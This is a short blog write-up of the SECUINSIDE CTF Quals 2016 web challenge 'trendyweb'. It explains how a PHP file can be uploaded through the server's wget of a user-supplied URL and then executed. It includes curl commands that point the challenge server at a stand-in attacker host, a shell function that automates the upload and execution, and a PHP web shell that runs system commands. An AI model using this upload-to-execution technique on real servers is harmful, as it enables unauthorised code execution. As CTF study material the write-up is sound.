---
layout: post
redirect_from:
  - /blog/2016/07/10/secuinside-ctf-trendyweb/
date: "2016-07-10T14:32:36+09:00"
tags: [ "ctf", "writeup", "web", "php" ]
"target_url": [ "https://ctftime.org/event/335" ]
---

# SECUINSIDE CTF Quals 2016 web100: trendyweb

This CTF was diffcult, and it seemed to be not well-prepared. I want to see the graph of the number of problems.

Our team could solve only this.
But, considering the solved numbers, we needed to solve also `CYKOR_0000*`s and `noted`.

## solution

Upload your `.php` as `avatar.png%3fhoge.php` into the `/data/$sessId/` directory and execute it on the server.


You can upload files via the `system('/usr/bin/wget '.escapeshellarg($origUrl));`.
Make `http://your-host.example.com/avatar.png?foo.php` returns something, and call:

``` sh
$ curl 'http://chal.cykor.kr:8082' -D- -H 'Cookie: PHPSESSID=mde2hg0rm37k28vl8rvatkco31; path=/' -F image='http://your-host.example.com/avatar.png?foo'
```

This makes the file on `http://chal.cykor.kr:8082/data/dd3e534e85eb4ca10180/avatar.png%3ffoo`.
So if you use `image='http://your-host.example.com/avatar.png?foo.php`, it becomes `http://chal.cykor.kr:8082/data/dd3e534e85eb4ca10180/avatar.png%3ffoo.php` and this is executed on the server when you request it.

This is enough to see the flag.
Define a utility function and explore it, you will found the executable which has the flag.

``` sh
execute_php() {
    cat > path/to/avatar.png
    key=$RANDOM
    curl 'http://chal.cykor.kr:8082' -D- -H 'Cookie: PHPSESSID=mde2hg0rm37k28vl8rvatkco31; path=/' -F image='http://your-host.example.com/avatar.png?'$key'.php'
    curl -D- 'http://chal.cykor.kr:8082/data/dd3e534e85eb4ca10180/avatar.png%3f'$key'.php'
}
```

``` php
<?php
system('id', $retval);
system('pwd', $retval);
system('ls -l /', $retval);
system('stat /flag_is_heeeeeeeereeeeeee', $retval);
system('/flag_is_heeeeeeeereeeeeee', $retval); // => flag
?>
```
